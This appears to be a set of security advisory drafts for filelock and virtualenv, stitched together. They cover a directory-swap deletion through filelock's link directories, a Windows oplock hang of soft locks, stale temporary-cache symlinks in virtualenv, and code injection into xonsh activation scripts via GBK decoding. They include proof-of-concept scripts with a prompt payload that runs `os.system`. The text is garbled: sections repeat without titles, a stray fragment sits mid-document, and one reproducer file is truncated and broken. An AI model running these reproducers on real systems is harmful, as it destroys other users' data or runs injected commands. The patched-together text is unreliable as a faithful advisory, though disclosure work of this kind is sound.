The link directory moved beside the database in `015d27c` ("fix(read-write): reject WAL databases and link beside the db (#805)"), and the dead-owner sweep came with `df06bbd` (#815). Both were first released in **4.1.0** (verified: `git tag --contains` gives 4.1.0 for both; 4.0.11 and 4.0.12 made the link in `TMPDIR`). macOS takes the link route for every connection since `5fd0c8f` (#820), first released in **4.1.1** (verified).

## Mechanism

When the lock connects through its private hard link, it disposes of `.filelock-*` directories with `shutil.rmtree` on a path. Nothing ties that path to the directory filelock created. `mkdtemp` makes the name unpredictable and the directory `0700`. The name is in the parent's listing as soon as it exists (`ls -a`), and renaming it needs write permission on the parent only. `0700` keeps the other user out of the directory; it does not stop a rename of the directory. There are two ways in, with the same preconditions.

**On release.** A connection lives for one acquisition: `_open_for_acquisition` opens it and `release()` reaches `close` through `_release` and `_finish_connection`. The code trusts the path from the acquire to the release, for as long as the application keeps the lock. While the lock user holds `write_lock()` on `/tmp/shared-cache/cache.db`, the directory lists `.filelock-<pid>--<host digest>-<random>/` (`0700`, owned by the lock user, containing `lock.db`). The other user runs two renames: that directory to `moved-aside`, then `victim_project` (a `0700` directory of the lock user with `notes.txt` inside) onto the link directory's name. When the lock user leaves the `with` block, `rmtree` deletes `victim_project` and everything in it with the lock user's permissions, and the process exits with status 0. `moved-aside/lock.db`, the real link, stays behind as an extra hard link to the database. The constructor's validation connection (`ReadWriteLock.__init__` opens and closes one, creating and removing a link directory) and the three error-path removals trust the path the same way, with windows a few system calls long.

**In the dead-owner sweep.** `_link_beside` calls `_sweep_links_of_the_dead(parent)` once per process and parent directory before `mkdtemp`. The first connect of every process on the link route runs it, the validation connection included. It runs `rmtree` on every `.filelock-*` directory whose name parses as a dead owner's. It checks neither the directory's owner, nor its mode, nor whether it holds only `lock.db`. `_owner_is_gone` splits the name after `.filelock-` into `pid`, `start`, `digest` (a hash of the host name) and a suffix. It returns `digest == _host_digest(host) and owner_is_stale(pid, host, start or None)`.

The other user can forge every field. Take `.filelock-2147483647--<digest>-x`. `pid` is the largest value the #821 range check accepts and above the PID limit of Linux and macOS, so `process_alive` gets `ESRCH` from `os.kill(pid, 0)`; the PID of any exited process, such as a child the other user just reaped, passes as well. `start` is empty, which the parser accepts because `_link_prefix` writes an empty field when it has no start token; with no token and a dead PID `owner_is_stale` returns `True`. `digest` is `sha256(host_name())[:16]`. `host_name()` adds a PID-namespace tag only when `/proc/self/ns/pid` is readable, which it is not on macOS or without `/proc`, so any local user can compute the digest, and it is in the name of every link directory the lock user creates. The parser does not look at the suffix.

One `rename("victim_project", ".filelock-2147483647--<digest>-x")` at any time, with no lock held, gets the tree deleted the next time any lock user process on the link route constructs a lock in that directory (a cron job, a CI step, a service restart). #821 made the parser reject non-ASCII digits and out-of-range PIDs; a well-formed name for a PID that is not running still selects the directory for removal.

The sweep's `rmtree` has a smaller effect that needs no lock user tree and works in a sticky directory, on Python 3.11, where `shutil.rmtree` recurses once per directory level. The other user creates a directory of their own under a forged dead-owner name in a `1777` directory, with 1500 nested subdirectories inside. The first `ReadWriteLock(...)` a lock user process on the link route constructs there raises `RecursionError`, which the `suppress(OSError)` at line 1050 does not catch. A second attempt in the same process skips the sweep and succeeds. Python 3.14 walks the same tree without an error.

## Reproduction

The scanner's reproducer for `ANT-2026-LSSZIUEO`, quoted as received. It ran against commit `b831496b0273`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys

shared = "/tmp/shared-cache"
project = f"{shared}/victim_project"

# ReadWriteLock takes the hard-link route (.filelock-* directory beside the database) on macOS, and elsewhere when
# /proc/self/fd/<n> is unusable. An empty /proc in a private mount namespace puts unmodified filelock on that route.
os.unshare(os.CLONE_NEWNS)
subprocess.run(["mount", "--make-rprivate", "/"], check=True)
subprocess.run(["mount", "-t", "tmpfs", "tmpfs", "/proc"], check=True)

# set up: a shared directory without the sticky bit, holding the victim's private tree
shutil.rmtree(shared, ignore_errors=True)
os.mkdir(shared)
os.chmod(shared, 0o777)
os.mkdir(project, 0o700)
with open(f"{project}/notes.txt", "w") as notes_file:
    notes_file.write("victim data\n")
shutil.chown(f"{project}/notes.txt", "victim", "victim")
shutil.chown(project, "victim", "victim")

rm = subprocess.run(["runuser", "-u", "attacker", "--", "rm", "-rf", project], capture_output=True, text=True)
print("attacker runs rm -rf on the victim's tree:", rm.stderr.strip())
assert os.path.exists(f"{project}/notes.txt"), "setup: the attacker could delete the tree without filelock"

# the victim takes the write lock and stays in its critical section
victim = subprocess.Popen(
    ["runuser", "-u", "victim", "--", sys.executable, "/tmp/repro.d/victim_hold_write_lock.py"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    text=True,
)
assert victim.stdout.readline() == "holding the write lock\n", "setup: the victim did not take the lock"
print("while the victim holds the lock:", sorted(os.listdir(shared)))

# attack
subprocess.run(["runuser", "-u", "attacker", "--", sys.executable, "/tmp/repro.d/attacker_swap_link_dir.py"], check=True)
link_dir = next(name for name in os.listdir(shared) if name.startswith(".filelock-"))
notes = f"{shared}/{link_dir}/notes.txt"
print("after the attacker's renames:", sorted(os.listdir(shared)))
print(f"{notes} exists:", os.path.exists(notes))
assert os.path.exists(notes), "setup: the attacker's renames did not happen"
```

## Impact

The other user chooses any directory that sits in the shared parent, and the lock user's process deletes it and everything in it with the lock user's permissions and no error; the lock user's program reports success. Without filelock that user can rename such a directory but cannot remove a non-empty one whose contents they have no permission on. With filelock the lock user's process destroys the contents. The release variant needs two `rename` calls at any point while the lock user holds the lock and wins no race against filelock's own code. The sweep variant needs one rename and no held lock, and fires on the next lock construction by any lock user process in that directory. The real link directory stays under its new name with an extra hard link to the database.

It is **not** reachable on stock Linux with `/proc` mounted at 4.2.0. The release variant is **not** reachable in a sticky directory. Here the name is the derived `.filelock-*` directory rather than the database, and the redirected operation is a recursive delete.

## Workarounds

- On macOS, and on any POSIX system where `/proc/self/fd` is unavailable, keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share one `ReadWriteLock` database between accounts through a `0777` or group-writable directory.
- Do not keep other directories of value beside a lock database in a directory other accounts can write; the deletion targets are siblings of the database.
- On Linux with `/proc` mounted, 4.2.0 does not take the link route and needs no workaround for this finding.

## Mechanism

`_connect` on Windows opens the database with `_open_non_reparse_fd`, checks through that handle that the file is a regular file, not a reparse point, and that its header does not declare WAL mode, and keeps the handle open while `sqlite3.connect(database)` opens the same name. The check covers the database, not the names beside it. On the first statement, `PRAGMA journal_mode=MEMORY`, SQLite takes its first lock on the database and looks for `<database>-wal`. A non-empty `-wal` beside a database that is not in WAL mode is a leftover SQLite deletes. The other account's file denies `DELETE`, so the pragma raises `SQLITE_IOERR_DELETE`, which reaches the caller as `sqlite3.OperationalError: disk I/O error`. `_do_acquire_inner` converts only "database is locked" into `Timeout`, so `acquire_read()`, `acquire_write()` and the async forms raise at once, on every call, until the file is gone. The lock user has no right to delete it.

The journal variant needs a database with content. Beside a non-empty database SQLite treats a `<database>-journal` with a valid header as hot (left by an interrupted write) and replays it before the first statement runs. The review's journal is 46 bytes: a file path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. That tail names a super-journal, and recovery ends by deleting the file it names. The lock user's `write_lock()` therefore deletes one file the other account chose, provided the lock user can delete it, and returns without error. SQLite opens a hot journal for writing, so the other account's journal must grant the lock account modify rights; a read-only journal makes every acquire raise `sqlite3.OperationalError: unable to open database file` instead. GHSA-v4x8-3wr5-3wq8 describes the same side-file behavior on POSIX, where the sticky bit plays the part the directory ACL plays here.

On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.

Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.

That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.

Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.
- Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.
- Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.
- What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.
- Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.
- Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.

## Affected code

Scanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.

## Introduced

[e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) "feat(soft): detect and break stale locks" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.

## Mechanism

Each attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.

A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.

## Evidence

Section `[2]` of `oplock_vm.py` acquired `soft.lock` as the test account, closed the holder's descriptor so the marker stayed with a live process id and no open handle, took a Level 1 oplock through the second account's read handle (`oplock granted: True`), and ran `SoftFileLock(marker, is_singleton=False).acquire(timeout=1)` on a thread. The call returned `Timeout` after 10.02 s, before the holder closed. The review did not establish what ends the wait at 10 s in the two-account runs; section `[1a]` of the same script, with the second account's handle, shows the same 10 s. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.

## Impact

Each `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.

## Workarounds

- Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls <dir> /inheritance:r /grant:r "<owner>:(OI)(CI)F" "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"`). `mode` does not do this on Windows.
- Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits.
- No `timeout`, `blocking` or `cancel_check` value bounds the wait.

## Summary

The app-data seeder can leave an environment linked to temporary package files that virtualenv deletes when creation
finishes. The environment-variable and configuration-file forms of `symlink_app_data` can enable this state even though
the command-line flag is disabled for temporary app-data. The resulting environment depends on a cache pathname that its
owner no longer controls.

Anthropic's OSS Scanner reported this as `ANT-2026-ZOE2GEPC` in `virtualenv-20261015-005`, received on 15 October 2026.
This draft records source review and functional remediation checks. The reporter's cross-account code-execution claim
has not been independently reproduced.

## Affected area

Integrity of app-data references after temporary cache cleanup.

## Attacker-controlled input

Symlink seeding must be enabled through `VIRTUALENV_SYMLINK_APP_DATA` or `symlink_app_data` in the configuration file,
and app-data setup must fall back to a temporary directory. A missing or unwritable configured cache can cause that
fallback. Ordinary copy seeding does not leave these references.

The security concern requires a shared temporary-directory parent where another account can acquire the deleted cache
pathname, followed by use of the affected environment. That account need not already be able to modify the environment
or the private cache while it exists. This differs from the security policy's excluded case of an account that already
controls live app-data contents. On a platform with a temporary-directory parent private to the environment owner, that
cross-account condition is absent. Windows functional checks do not establish cross-account exposure under Windows
defaults.

## Affected code

The relevant 21.14.8 source is in
[symlink seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/via_app_data.py),
[temporary cache cleanup](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/app_data/via_tempdir.py).

## Mechanism

When app-data setup falls back to a temporary directory, the command-line `--symlink-app-data` action is disabled. A
value supplied by `VIRTUALENV_SYMLINK_APP_DATA` or `virtualenv.ini` can still become the parser default, and the seeder
constructor accepts that value without rechecking the cache lifetime. It links `site-packages/pip` into the temporary
cache. Session cleanup deletes that cache, leaving a dangling link whose pathname can later be claimed by another
account on a shared temporary filesystem.

## Reproduction and evidence

The scanner ran its reproduction as two unprivileged users, with root used only to switch identities. The environment
owner had an unwritable home, so app-data fell back to `/tmp`. The control used the command-line flag and received a
real pip directory. With `VIRTUALENV_SYMLINK_APP_DATA=1`, the new environment instead contained a `pip` link into a
deleted `/tmp/tmpXXXXXXXX` directory. A second uid recreated the target path and placed a fake `pip/__init__.py` there.
When the owner ran `venv/bin/pip --version`, that module created a marker inside the owner's environment and printed
`this is not pip`.

The cross-account path requires a shared temporary parent, a second account able to claim the deleted name, and later
use of the environment. A private temporary parent removes that route. The report traces the incomplete temporary-cache
guard to #1661, first released in 20.0.6.
[Public fix PR #3437](https://github.com/pypa/virtualenv/pull/3437) copies packages whenever app-data is
temporary, whatever supplied the symlink option. The implementation review checked the remediation; it did not rerun the
cross-account reproduction.

## Attack sequence

```mermaid
sequenceDiagram
    participant U as Environment owner
    participant V as virtualenv seeder
    participant T as Temporary app-data in /tmp
    participant E as site-packages/pip link
    participant A as Other local account
    U->>V: VIRTUALENV_SYMLINK_APP_DATA=1 with unwritable home
    V->>T: create transient cache
    V->>E: link pip to cache path
    V->>T: delete cache at session exit
    A->>T: reclaim old name and plant fake pip
    U->>E: run bin/pip --version
    E->>T: import fake pip through stale link
    T-->>U: attacker's code runs as owner
```

in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs

## Impact

Seed packages become unavailable after temporary-cache cleanup. With a shared temporary-directory parent, a later
package load can follow the stale cache reference into a pathname another account has acquired. A private
temporary-directory parent prevents that cross-account condition.

Severity: low.

## Versions tested

The reproduced release is 21.14.8. The vulnerable seeder path is unchanged in 21.14.9. The affected range starts at
21.14.8, the first release confirmed here; earlier releases may also be affected. No fixed release is available.

The reporter identifies 20.0.6 as the first affected release. Commit
[c3453b6c](https://github.com/pypa/virtualenv/commit/c3453b6c381d28377c8e0115bf1124b2ca7b3c2b), first included in
20.0.6, contains the incomplete transient-cache guard. Historical runtime behavior across that range remains unverified.

The proposed fix copies seed packages whenever app-data is temporary, including when symlink seeding was selected
through environment variables or configuration. The environment then remains usable after cache cleanup.

Proposed fix: [PR #3437](https://github.com/pypa/virtualenv/pull/3437).

## Known mitigation

The proposed fix is in [public PR #3437](https://github.com/pypa/virtualenv/pull/3437).

The fix checks the selected app-data lifetime in the seeder constructor and always copies from temporary app-data,
regardless of where the symlink option came from. Persistent caches retain symlink seeding.

Until a fixed release is available, disable symlink seeding in configuration and environment variables, or provide a
writable persistent cache private to the environment owner. Recreate affected environments after correcting those
settings. No fixed release is available yet.

## Summary

Caller-supplied prompt text can become executable syntax in the xonsh activation script. An attacker must influence the
value passed to virtualenv, and a user must subsequently activate the environment.

## Affected area

Xonsh reads a UTF-8 activation script using a legacy multibyte encoding such as GBK. Printable non-ASCII bytes can
change how the reader recognizes an adjacent quote. The report concerns POSIX activation. It does not establish exposure
through unrelated activators.

## Attacker-controlled input

The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated
activation script.

## Affected code

The relevant 21.14.8 source is in
[xonsh quote()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/xonsh/__init__.py),
[UTF-8 template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py).

## Mechanism

The generator writes `activate.xsh` as UTF-8. Its `quote()` used `repr()`, which leaves printable non-ASCII characters
in the file and backslash-escapes an embedded quote. Xonsh's `source` reads the file using `$XONSH_ENCODING`. With GBK
or Big5, the UTF-8 bytes of `中` end in `0xad`, which pairs with the following `0x5c` backslash as one decoded character.
The backslash no longer escapes the quote. A prompt containing both quote kinds can then close its Python string literal
and supply statements that run during activation. With UTF-8 source decoding, the same value stays inside the literal.

## Reproduction and evidence

The original scanner finding, `ANT-2026-PAUVP7YL`, demonstrated this byte-level failure in `activate_this.py`: a hostile
prompt loaded through `exec(open(file).read(), ...)` under GBK created a marker, while UTF-8 and `runpy.run_path`
controls did not. The xonsh path in this advisory was identified in the subsequent maintainer-provided review.
[PR #3432](https://github.com/pypa/virtualenv/pull/3432) shows the xonsh source-decoding chain and changes `quote()` to
`ascii()`, which writes non-ASCII characters as escapes. Its regression test encodes the generated literal as ASCII,
decodes it as GBK, and checks that `ast.literal_eval` returns the original prompt.

The attack needs control of the prompt or destination value, an affected xonsh source encoding, and later sourcing of
the generated file. The original `activate_this.py` reproducer does not itself prove xonsh execution; that result is
attributed to the separate review. Existing `activate.xsh` files must be regenerated after the fix.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prompt supplier
    participant V as virtualenv quote()
    participant F as activate.xsh bytes
    participant X as xonsh source
    A->>V: 中 plus escaped quote and statements
    V->>F: repr writes UTF-8 中 followed by backslash
    alt XONSH_ENCODING is UTF-8
        F->>X: backslash remains an escape
        X-->>A: prompt remains data
    else XONSH_ENCODING is GBK or Big5
        F->>X: decoder consumes backslash as trail byte
        X->>X: quote closes and statements run
    end
    Note over V,X: ascii() emits only ASCII bytes and preserves the literal
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-PAUVP7YL`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import subprocess
import sys
from pathlib import Path
from shutil import rmtree

work = Path("/tmp/activate-this-gbk")
rmtree(work, ignore_errors=True)
work.mkdir()
env_dir = work / "venv"
marker = work / "MARKER"

# set up: a zh_CN.GBK locale, which the image does not ship
subprocess.run([sys.executable, "/tmp/repro.d/install_gbk_locale.py", work / "locales"], check=True)
utf8_session = {"PATH": os.environ["PATH"], "LANG": "C.UTF-8"}
gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": str(work / "locales")}

# attacker: text that a tool relays as --prompt
# the payload's " makes repr() delimit with ' and write the prompt's own ' as \'
# 中 is e4 b8 ad in UTF-8; GBK reads e4 b8 as one character and ad 5c, ad plus that backslash, as the next
payload = f'__import__("os").system("touch {marker}")'
hostile_prompt = "中" + "';" + payload + "#"

# user: creates the environment with the virtualenv command
subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--prompt", hostile_prompt, env_dir], check=True)
activate_this = (env_dir / "bin" / "activate_this.py").read_bytes()
prompt_line = next(line for line in activate_this.splitlines() if line.startswith(b'os.environ["VIRTUAL_ENV_PROMPT"]'))
print(f"activate_this.py read as UTF-8: {prompt_line.decode('utf-8')}")
print(f"activate_this.py read as GBK:   {prompt_line.decode('gbk')}")
assert not marker.exists(), "payload ran at creation time"

# trigger: the same program activates the environment, first in a UTF-8 session, then in a GBK one
activate = [sys.executable, "/tmp/repro.d/activate_with_exec_open.py", env_dir]
control = subprocess.run(activate, env=utf8_session, stdout=subprocess.PIPE, encoding="utf-8", check=True)
ran_in_utf8_session = marker.exists()
print(f"CONTROL  UTF-8 session: {control.stdout.strip()}; {marker} exists: {ran_in_utf8_session}")

observed = subprocess.run(activate, env=gbk_session, stdout=subprocess.PIPE, encoding="gbk", check=True)
ran_in_gbk_session = marker.exists()
print(f"OBSERVED GBK session:   {observed.stdout.strip()}; {marker} exists: {ran_in_gbk_session}")

# check: the prompt is data and must not run in either session
print("BUG" if ran_in_gbk_session and not ran_in_utf8_session else "OK")
```

**`repro.d/activate_with_exec_open.py`**

**`repro.d/install_gbk_locale.py`**

```text

import subprocess

        try:
            char = bytes([lead, trail]).decode("gbk")
        except UnicodeDecodeError:
            continue
        charmap.append(f"<U{ord(char):04X}> /x{lead:02x}/x{trail:02x}")
charmap.append("END CHARMAP")
with open(f"{locpath}/GBK.charmap", "w") as charmap_file:
    charmap_file.write("\n".join(charmap) + "\n")

    sys.exit(f"zh_CN.GBK locale not usable: {codeset}")
```

**`repro.d/zh_CN_minimal.locale`**

```text
comment_char %
escape_char /
% Stand-in for glibc's locales/zh_CN: ASCII character classes only. What matters is the codeset name, GBK, which
% comes from the charmap given to localedef with -f.
LC_CTYPE
upper <U0041>..<U005A>
lower <U0061>..<U007A>
digit <U0030>..<U0039>
space <U0009>..<U000D>;<U0020>
cntrl <U0000>..<U001F>;<U007F>
punct <U0021>..<U002F>;<U003A>..<U0040>;<U005B>..<U0060>;<U007B>..<U007E>
xdigit <U0030>..<U0039>;<U0041>..<U0046>;<U0061>..<U0066>
blank <U0009>;<U0020>
END LC_CTYPE
LC_COLLATE

order_end
END LC_COLLATE
```

## Impact

An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script
precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The
attack requires control of argument data and subsequent user activation; it does not require replacing an executable or
controlling app-data contents.

## Versions tested

The supplied follow-up review marks command execution as independently confirmed by its author. The implementation
review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation
source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation
of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.

## Known mitigation

Use trusted prompt and destination values. Use UTF-8 source decoding in xonsh on older releases.
Recreate environments with virtualenv 21.14.9 or later.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

The original report was supplied by Anthropic's OSS Scanner as ANT-2026-PAUVP7YL. The subsequent maintainer-provided
review identified the remaining activation path.

## Additional fix branch

[PR #3411](https://github.com/pypa/virtualenv/pull/3411) also uses ASCII-only literals for paths and prompts, alongside
its activation-state changes. Both branches must retain this quoting rule when integrated.
